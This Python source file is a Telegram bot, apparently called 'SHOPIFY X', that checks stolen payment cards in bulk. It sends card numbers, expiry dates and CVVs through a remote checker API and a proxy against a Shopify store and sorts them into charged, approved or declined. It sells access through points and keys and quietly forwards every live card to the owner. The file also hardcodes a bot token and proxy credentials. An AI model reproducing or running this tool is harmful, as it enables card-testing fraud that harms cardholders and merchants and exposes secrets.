# ============================================
# ╔══════════════════════════════════════════╗
# ║   SHOPIFY X - GATEWAY CHECKER           ║
# ║  Owner: @S_1xD | Channel: @xb1ns      ║
# ╚══════════════════════════════════════════╝
# ============================================

import json, re, random, string, asyncio, aiohttp
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = "8920042039:AAEgHZ6bhMxjNIws11omZaePEuvp9ytWjE4"
CHANNEL = "@xb1ns"
OWNER_ID = 8418640972
ADMIN_IDS = [8418640972, 7502457749]
BOT_USERNAME = "@S_1xD"
CHECKER_API = "http://193.70.34.27:20313/shopify"
DEFAULT_SITE = "https://fairhope-soap-company.myshopify.com"
DEFAULT_PROXY = "sg-sin.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"

EMO = {
    "FIRE": "5116414868357907335", "CHECK": "5444987348334965906", "CROSS": "5447647474984449520",
    "LOAD": "5258113901106580375", "CARD": "5447453226498552490", "ROCKET": "4904936030232117798",
    "CHART": "5445146408153806223", "SEARCH": "5258396243666681152", "SIGNAL": "5219943216781995020",
    "LOCK": "5454386656628991407", "BANK": "5303159080020372094", "WARN": "4915853119839011973",
    "STOP": "5116151848855667552", "STAR": "5343636681473935403", "USER": "5445174334031166029",
    "FILE": "5447408120752013199", "GLOBE": "5303440357428586778", "CROWN": "5303547611351902889",
    "SPARK": "5172632227871196306", "CLOCK": "5303243514782443814", "BULK": "5303102515301083665",
    "KEY": "5454386656628991407", "ID": "5447311106030726740", "CHANNEL_EMO": "5116445341150872576",
    "USERS": "5454371323595744068", "SITE": "5447602197439218445", "GATE": "5447319442562251569",
    "INFO": "5289930378885214069", "PREMIUM": "5406756500108501710", "FREE": "5406756500108501710",
    "HIT": "5122933683820430249", "REFRESH": "5454245266305604993", "BACK": "5305618829265628111",
    "MENU": "5303102515301083665", "PLUS": "5116599934203724812", "NOTE": "5444860552310457690",
    "TAG": "5447311106030726740", "PRICE": "5283232570660634549", "COUNTRY": "5303440357428586778",
    "ZAP": "5219943216781995020", "GEAR": "4904936030232117798", "SEND": "5116445341150872576",
    "DIAMOND": "5870498447068502918", "HOURGLASS": "5303243514782443814", "TARGET": "5444987348334965906",
    "BROADCAST": "5116445341150872576", "GIFT": "5343636681473935403", "LINK": "5447311106030726740",
    "SHIELD": "5454386656628991407", "COIN": "5283232570660634549"
}

USERS = {}
KEYS = {}

def em(k):
    eid = EMO.get(k, "")
    return f'<tg-emoji emoji-id="{eid}">👍</tg-emoji>' if eid else "❓"

def btn(text, callback):
    return {"text": text, "callback_data": callback}

def btn_url(text, url):
    return {"text": text, "url": url}

def is_admin(uid): return uid in ADMIN_IDS
def is_owner(uid): return uid == OWNER_ID

def get_user(uid):
    uid = str(uid)
    if uid not in USERS:
        USERS[uid] = {"id": uid, "premium": False, "points": 50, "last_daily": 0,
                       "checks": 0, "charged": 0, "approved": 0, "declined": 0,
                       "checking": False, "banned": False}
    return USERS[uid]

def is_premium(uid): return get_user(uid)["premium"] or is_admin(uid)

async def daily_reset(uid):
    user = get_user(uid)
    if is_premium(uid): return
    today = datetime.now().strftime("%Y-%m-%d")
    last = datetime.fromtimestamp(user["last_daily"]).strftime("%Y-%m-%d") if user["last_daily"] else ""
    if today != last:
        user["points"] = 50
        user["last_daily"] = int(datetime.now().timestamp())

async def check_gateway():
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(f"{CHECKER_API}?site={DEFAULT_SITE}&cc=4111111111111111|12|25|123&proxy={DEFAULT_PROXY}", timeout=10) as r:
                return r.status == 200
    except: return False

def parse_cards(text):
    cards = []
    pattern = re.compile(r'(\d{15,16})[|\s]+(\d{2})[|\s]+(\d{2,4})[|\s]+(\d{3,4})')
    for m in pattern.finditer(text):
        cn, mm, yy, cv = m.groups()
        if len(yy) == 4: yy = yy[-2:]
        if 15 <= len(cn) <= 16 and 1 <= int(mm) <= 12 and 3 <= len(cv) <= 4:
            cards.append({"number": cn, "month": mm, "year": yy, "cvv": cv, "fmt": f"{cn}|{mm}|{yy}|{cv}"})
    return cards

async def check_card(card):
    try:
        url = f"{CHECKER_API}?site={DEFAULT_SITE}&cc={card['fmt']}&proxy={DEFAULT_PROXY}"
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=30) as r:
                if r.status != 200: return {"status": "ERROR", "card": card["fmt"], "response": f"HTTP {r.status}"}
                text = await r.text()
                try: raw = json.loads(text)
                except: return {"status": "ERROR", "card": card["fmt"], "response": "Invalid JSON"}
                msg = (raw.get("Response", "") or "").lower()
                price = raw.get("Price", "0.00")
                gw = raw.get("Gateway", "Shopify")
                status = "DECLINED"
                if any(x in msg for x in ["charged", "order_placed", "thank you", "payment successful"]): status = "CHARGED"
                elif any(x in msg for x in ["approved", "insufficient", "3d", "verification", "authenticate", "pending"]): status = "APPROVED"
                return {"status": status, "card": card["fmt"], "gateway": gw, "site": DEFAULT_SITE,
                        "price": price, "response": (raw.get("Response", "") or "")[:200]}
    except Exception as e: return {"status": "ERROR", "card": card["fmt"], "response": str(e)}

async def fwd_to_owner(bot, result, uid):
    try:
        user = get_user(uid)
        utype = f'{em("PREMIUM")} Premium' if is_premium(uid) else f'{em("FREE")} Free'
        icon = em("FIRE") if result["status"] == "CHARGED" else em("CHECK")
        msg = (f'{icon} <b>CC HIT!</b>\n\n<blockquote>\n'
               f'{em("CARD")} <b>Card:</b> <code>{result["card"]}</code>\n'
               f'{em("GATE")} <b>Gateway:</b> {result.get("gateway", "Shopify")}\n'
               f'{em("PRICE")} <b>Price:</b> ${result.get("price", "0.00")}\n'
               f'{em("NOTE")} <b>Response:</b> {result.get("response", "N/A")}\n'
               f'{em("SITE")} <b>Site:</b> {result.get("site", DEFAULT_SITE)}\n'
               f'{em("USER")} <b>By:</b> {utype}\n'
               f'{em("CLOCK")} <b>Time:</b> {datetime.now().strftime("%m/%d/%Y, %I:%M:%S %p")}\n</blockquote>')
        await bot.send_message(OWNER_ID, msg, parse_mode="HTML")
    except: pass

def fmt_result(result):
    if result["status"] == "CHARGED": se, st = em("FIRE"), "CHARGED!"
    elif result["status"] == "APPROVED": se, st = em("CHECK"), "APPROVED"
    elif result["status"] == "ERROR": se, st = em("WARN"), "ERROR"
    else: se, st = em("CROSS"), "DECLINED"
    msg = f'{se} <b>{st}</b>\n\n<blockquote>\n{em("CARD")} <b>Card:</b> <code>{result["card"]}</code>\n{em("GATE")} <b>Gateway:</b> {result.get("gateway", "?")}\n'
    if result["status"] == "CHARGED": msg += f'{em("PRICE")} <b>Amount:</b> ${result.get("price", "0.00")}\n'
    msg += f'{em("NOTE")} <b>Response:</b> {result.get("response", "N/A")}\n</blockquote>'
    return msg

def generate_key():
    chars = string.ascii_uppercase + string.digits
    return "XB1NS-" + "".join(random.choice(chars) for _ in range(8))

def start_kb(uid):
    kb = [[btn(" CMDS", "menu_cmds"), btn(" INFO", "menu_info")]]
    if is_admin(uid): kb.append([btn(" ADMIN PANEL", "admin_panel")])
    kb.append([btn_url(" CHANNEL", "https://t.me/xb1ns")])
    return InlineKeyboardMarkup([[InlineKeyboardButton(**b) for b in row] if isinstance(row, list) else InlineKeyboardButton(**row) for row in kb])

def cmds_kb():
    kb = [
        [btn(" SINGLE CHECK", "cmd_cc"), btn(" BULK CHECK", "cmd_chk")],
        [btn(" REDEEM KEY", "cmd_redeem")],
        [btn(" BACK", "main_menu")]
    ]
    return InlineKeyboardMarkup([[InlineKeyboardButton(**b) for b in row] for row in kb])

def admin_kb():
    kb = [
        [btn(" GEN KEY", "admin_genkey"), btn(" STATS", "admin_stats")],
        [btn(" ADD PREMIUM", "admin_addprem"), btn(" BROADCAST", "admin_broadcast")],
        [btn(" BACK", "main_menu")]
    ]
    return InlineKeyboardMarkup([[InlineKeyboardButton(**b) for b in row] for row in kb])

def back_kb(data="main_menu"):
    return InlineKeyboardMarkup([[InlineKeyboardButton(**btn(" BACK", data))]])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    name = update.effective_user.first_name or "User"
    user = get_user(uid)
    if user["banned"]:
        await update.message.reply_text(f'{em("STOP")} <b>Banned!</b>', parse_mode="HTML")
        return
    await daily_reset(uid)
    gw = await check_gateway()
    w = (f'{em("FIRE")} <b>SHOPIFY X</b> {em("ROCKET")}\n\n'
         f'<blockquote>{em("DIAMOND")} Premium Gateway Checker\n'
         f'{em("GATE")} Gateway: {em("CHECK")} Online' if gw else f'{em("CROSS")} Offline'
         f'\n{em("SITE")} Site: {DEFAULT_SITE}</blockquote>\n\n'
         f'{em("USER")} <b>Welcome, {name}!</b>\n{em("ID")} <b>ID:</b> <code>{uid}</code>\n')
    if is_premium(uid): w += f'{em("PREMIUM")} <b>Status:</b> Premium (Unlimited)\n'
    else: w += f'{em("FREE")} <b>Status:</b> Free\n{em("COIN")} <b>Points:</b> {user["points"]}\n{em("KEY")} <b>Redeem key for more points!</b>\n'
    await update.message.reply_text(w, parse_mode="HTML", reply_markup=start_kb(uid))

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text: return
    text = update.message.text.strip()
    uid = update.effective_user.id
    cid = update.effective_chat.id
    user = get_user(uid)
    if user["banned"]: return
    await daily_reset(uid)

    if text.startswith("/start"):
        await start(update, context)
    elif text.startswith("/cc "):
        if user["checking"]:
            await update.message.reply_text(f'{em("HOURGLASS")} <b>Wait!</b>\n\n<blockquote>Previous check still running.</blockquote>', parse_mode="HTML")
            return
        inp = text[4:].strip()
        cards = parse_cards(inp)
        if not cards:
            await update.message.reply_text(f'{em("CROSS")} <b>Invalid!</b>\n<code>/cc 4111111111111111|12|25|123</code>', parse_mode="HTML")
            return
        if not is_premium(uid):
            if user["points"] < 1:
                await update.message.reply_text(f'{em("CROSS")} <b>No points!</b>\n\n<blockquote>{em("COIN")} 0 points.\n{em("CLOCK")} Resets daily or use /redeem</blockquote>', parse_mode="HTML")
                return
            user["points"] -= 1
        user["checking"] = True
        sm = await update.message.reply_text(f'{em("LOAD")} <b>Checking...</b>\n\n<blockquote>{em("CARD")} <code>{cards[0]["fmt"]}</code></blockquote>', parse_mode="HTML")
        result = await check_card(cards[0])
        user["checks"] += 1
        user["checking"] = False
        if result["status"] == "CHARGED": user["charged"] += 1; await fwd_to_owner(context.bot, result, uid)
        elif result["status"] == "APPROVED": user["approved"] += 1; await fwd_to_owner(context.bot, result, uid)
        else: user["declined"] += 1
        rmsg = fmt_result(result)
        if not is_premium(uid): rmsg += f'\n{em("COIN")} <b>Points:</b> {user["points"]}'
        try: await sm.edit_text(rmsg, parse_mode="HTML", reply_markup=back_kb("menu_cmds"))
        except: await update.message.reply_text(rmsg, parse_mode="HTML", reply_markup=back_kb("menu_cmds"))

    elif text.startswith("/chk"):
        after = text[4:].strip()
        cards = parse_cards(after) if after else []
        if not cards and update.message.reply_to_message and update.message.reply_to_message.text:
            cards = parse_cards(update.message.reply_to_message.text)
        if not cards:
            await update.message.reply_text(f'{em("FILE")} <b>Usage:</b>\n<code>/chk card|mm|yy|cvv</code>\nOr reply to .txt', parse_mode="HTML")
            return
        if not is_premium(uid):
            if len(cards) > user["points"]:
                await update.message.reply_text(f'{em("CROSS")} <b>Not enough points!</b>\n\n<blockquote>{em("COIN")} Points: {user["points"]}\n{em("CARD")} Cards: {len(cards)}\n{em("KEY")} Use /redeem</blockquote>', parse_mode="HTML")
                return
            if len(cards) > 100: cards = cards[:100]
        if len(cards) > 5000: cards = cards[:5000]
        sm = await update.message.reply_text(f'{em("LOAD")} <b>Bulk Check Started!</b>\n\n<blockquote>{em("CARD")} Cards: {len(cards)}\n{em("GATE")} Site: {DEFAULT_SITE}</blockquote>', parse_mode="HTML")
        charged = approved = declined = errors = 0
        for i, card in enumerate(cards):
            if not is_premium(uid):
                if user["points"] < 1: break
                user["points"] -= 1
            result = await check_card(card)
            user["checks"] += 1
            if result["status"] == "CHARGED": charged += 1; user["charged"] += 1; await fwd_to_owner(context.bot, result, uid)
            elif result["status"] == "APPROVED": approved += 1; user["approved"] += 1; await fwd_to_owner(context.bot, result, uid)
            elif result["status"] == "ERROR": errors += 1
            else: declined += 1; user["declined"] += 1
            if i % 5 == 0 or i == len(cards) - 1:
                prog = f'{em("CHART")} <b>Progress:</b> {i+1}/{len(cards)}\n{em("FIRE")} <b>Charged:</b> {charged}  {em("CHECK")} <b>Approved:</b> {approved}\n{em("CROSS")} <b>Declined:</b> {declined}  {em("WARN")} <b>Errors:</b> {errors}'
                try: await sm.edit_text(f'{em("ROCKET")} <b>BULK RUNNING</b>\n\n<blockquote>{prog}</blockquote>', parse_mode="HTML")
                except: pass
            await asyncio.sleep(0.1)
        final = f'{em("CHECK")} <b>BULK COMPLETE</b>\n\n<blockquote>\n{em("CARD")} <b>Total:</b> {len(cards)}\n{em("FIRE")} <b>Charged:</b> {charged}\n{em("CHECK")} <b>Approved:</b> {approved}\n{em("CROSS")} <b>Declined:</b> {declined}\n{em("WARN")} <b>Errors:</b> {errors}\n</blockquote>'
        if not is_premium(uid): final += f'\n{em("COIN")} <b>Points left:</b> {user["points"]}'
        try: await sm.edit_text(final, parse_mode="HTML", reply_markup=back_kb("menu_cmds"))
        except: await update.message.reply_text(final, parse_mode="HTML", reply_markup=back_kb("menu_cmds"))

    elif text.startswith("/redeem"):
        key = text[7:].strip()
        if not key:
            await update.message.reply_text(f'{em("KEY")} <b>Usage:</b>\n<code>/redeem XB1NS-XXXXXXXX</code>', parse_mode="HTML")
            return
        if key not in KEYS: await update.message.reply_text(f'{em("CROSS")} <b>Invalid key!</b>', parse_mode="HTML")
        elif KEYS[key].get("used_by"): await update.message.reply_text(f'{em("CROSS")} <b>Key already used!</b>', parse_mode="HTML")
        else:
            pts = KEYS[key]["points"]
            user["points"] += pts
            KEYS[key]["used_by"] = str(uid)
            await update.message.reply_text(f'{em("GIFT")} <b>Key Redeemed!</b>\n\n<blockquote>{em("COIN")} +{pts} points\n{em("COIN")} Total: {user["points"]}</blockquote>', parse_mode="HTML", reply_markup=start_kb(uid))

    elif is_admin(uid):
        args = text.split()
        cmd = args[0].lower()
        if cmd == "/addpremium" and len(args) > 1:
            puid = args[1]
            get_user(puid)["premium"] = True
            await update.message.reply_text(f'{em("CHECK")} <b>Premium added!</b>\nUser: <code>{puid}</code>', parse_mode="HTML")
            try: await context.bot.send_message(puid, f'{em("PREMIUM")} <b>Premium Activated!</b>\n\n<blockquote>Unlimited access!</blockquote>', parse_mode="HTML")
            except: pass
        elif cmd == "/genkey" and len(args) > 1:
            pts = int(args[1]) if args[1].isdigit() else 50
            key = generate_key()
            KEYS[key] = {"points": pts, "used_by": None, "created": int(datetime.now().timestamp())}
            await update.message.reply_text(f'{em("KEY")} <b>Key Generated!</b>\n\n<blockquote><code>{key}</code>\n{em("COIN")} Points: {pts}\n{em("NOTE")} Use: <code>/redeem {key}</code></blockquote>', parse_mode="HTML")
        elif cmd == "/broadcast" and len(args) > 1:
            bc = " ".join(args[1:])
            sent = 0
            for u in USERS:
                try: await context.bot.send_message(u, f'{em("BROADCAST")} <b>ANNOUNCEMENT</b>\n\n<blockquote>{bc}</blockquote>', parse_mode="HTML"); sent += 1
                except: pass
                await asyncio.sleep(0.05)
            await update.message.reply_text(f'{em("CHECK")} <b>Sent to {sent} users!</b>', parse_mode="HTML")
        elif cmd == "/adminstats":
            total = len(USERS)
            prem = sum(1 for u in USERS.values() if u["premium"])
            await update.message.reply_text(f'{em("CROWN")} <b>ADMIN STATS</b>\n\n<blockquote>\n{em("USERS")} Total: {total}\n{em("PREMIUM")} Premium: {prem}\n{em("FREE")} Free: {total-prem}\n{em("KEY")} Keys: {len(KEYS)}\n</blockquote>', parse_mode="HTML")

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data = q.data
    uid = update.effective_user.id
    cid = update.effective_chat.id
    mid = q.message.message_id
    user = get_user(uid)
    await daily_reset(uid)

    if data == "main_menu":
        gw = await check_gateway()
        w = (f'{em("FIRE")} <b>SHOPIFY X</b> {em("ROCKET")}\n\n<blockquote>'
             f'{em("GATE")} Gateway: {em("CHECK")} Online' if gw else f'{em("CROSS")} Offline'
             f'\n{em("SITE")} Site: {DEFAULT_SITE}</blockquote>\n\n{em("USER")} <b>Menu</b>\n')
        if is_premium(uid): w += f'{em("PREMIUM")} <b>Premium</b>\n'
        else: w += f'{em("COIN")} <b>Points:</b> {user["points"]}\n'
        await q.edit_message_text(w, parse_mode="HTML", reply_markup=start_kb(uid))

    elif data == "menu_cmds":
        gw = await check_gateway()
        msg = (f'{em("MENU")} <b>COMMANDS</b>\n\n<blockquote>\n'
               f'{em("GATE")} <b>Gateway:</b> {em("CHECK")} Online' if gw else f'{em("CROSS")} Offline'
               f'\n{em("SITE")} <b>Site:</b> {DEFAULT_SITE}\n\n'
               f'{em("CARD")} <b>/cc</b> - Single check\n{em("BULK")} <b>/chk</b> - Bulk check\n{em("KEY")} <b>/redeem</b> - Redeem key\n')
        if not is_premium(uid): msg += f'\n{em("COIN")} <b>Points:</b> {user["points"]} (1 per check)\n{em("CLOCK")} <b>Daily reset:</b> 50 points'
        else: msg += f'\n{em("PREMIUM")} <b>Unlimited access</b>'
        msg += '</blockquote>'
        await q.edit_message_text(msg, parse_mode="HTML", reply_markup=cmds_kb())

    elif data == "menu_info":
        msg = (f'{em("INFO")} <b>INFORMATION</b>\n\n<blockquote>\n{em("USER")} <b>ID:</b> <code>{uid}</code>\n'
               f'{em("ID")} <b>Status:</b> {em("PREMIUM")} Premium' if is_premium(uid) else f'{em("FREE")} Free')
        if not is_premium(uid): msg += f'\n{em("COIN")} <b>Points:</b> {user["points"]}'
        msg += (f'\n{em("CHART")} <b>Checks:</b> {user["checks"]}\n{em("FIRE")} <b>Charged:</b> {user["charged"]}\n'
                f'{em("CHECK")} <b>Approved:</b> {user["approved"]}\n{em("CROSS")} <b>Declined:</b> {user["declined"]}\n'
                f'{em("CHANNEL_EMO")} <b>Channel:</b> {CHANNEL}\n</blockquote>')
        await q.edit_message_text(msg, parse_mode="HTML", reply_markup=back_kb())

    elif data == "cmd_cc":
        await q.edit_message_text(f'{em("CARD")} <b>SINGLE CHECK</b>\n\n<blockquote><code>/cc 4111111111111111|12|25|123</code>\n\n{em("COIN")} Uses 1 point per check</blockquote>', parse_mode="HTML", reply_markup=back_kb("menu_cmds"))
    elif data == "cmd_chk":
        await q.edit_message_text(f'{em("BULK")} <b>BULK CHECK</b>\n\n<blockquote><code>/chk card|mm|yy|cvv</code>\nOr reply to .txt\n\n{em("COIN")} Points per card\n{em("PREMIUM")} Premium = Unlimited</blockquote>', parse_mode="HTML", reply_markup=back_kb("menu_cmds"))
    elif data == "cmd_redeem":
        await q.edit_message_text(f'{em("KEY")} <b>REDEEM KEY</b>\n\n<blockquote><code>/redeem XB1NS-XXXXXXXX</code>\n\n{em("GIFT")} Get keys from admin</blockquote>', parse_mode="HTML", reply_markup=back_kb("menu_cmds"))
    elif data == "admin_panel" and is_admin(uid):
        await q.edit_message_text(f'{em("CROWN")} <b>ADMIN PANEL</b>\n\n<blockquote>{em("KEY")} /genkey points\n{em("PREMIUM")} /addpremium id\n{em("BROADCAST")} /broadcast msg\n{em("CHART")} /adminstats</blockquote>', parse_mode="HTML", reply_markup=admin_kb())
    elif data == "admin_genkey" and is_admin(uid):
        await q.edit_message_text(f'{em("KEY")} <b>GENERATE KEY</b>\n\n<blockquote><code>/genkey 100</code>\n\nGenerates a redeemable key with points</blockquote>', parse_mode="HTML", reply_markup=back_kb("admin_panel"))
    elif data == "admin_addprem" and is_admin(uid):
        await q.edit_message_text(f'{em("PREMIUM")} <b>ADD PREMIUM</b>\n\n<blockquote><code>/addpremium user_id</code>\n\nGrants unlimited access</blockquote>', parse_mode="HTML", reply_markup=back_kb("admin_panel"))
    elif data == "admin_broadcast" and is_admin(uid):
        await q.edit_message_text(f'{em("BROADCAST")} <b>BROADCAST</b>\n\n<blockquote><code>/broadcast your message</code>\n\nSends to all users</blockquote>', parse_mode="HTML", reply_markup=back_kb("admin_panel"))
    elif data == "admin_stats" and is_admin(uid):
        total = len(USERS)
        prem = sum(1 for u in USERS.values() if u["premium"])
        await q.edit_message_text(f'{em("CHART")} <b>BOT STATS</b>\n\n<blockquote>\n{em("USERS")} Total: {total}\n{em("PREMIUM")} Premium: {prem}\n{em("FREE")} Free: {total-prem}\n</blockquote>', parse_mode="HTML", reply_markup=back_kb("admin_panel"))

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cc", handle_message))
    app.add_handler(CommandHandler("chk", handle_message))
    app.add_handler(CommandHandler("redeem", handle_message))
    app.add_handler(CommandHandler("addpremium", handle_message))
    app.add_handler(CommandHandler("genkey", handle_message))
    app.add_handler(CommandHandler("broadcast", handle_message))
    app.add_handler(CommandHandler("adminstats", handle_message))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(callback_handler))
    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()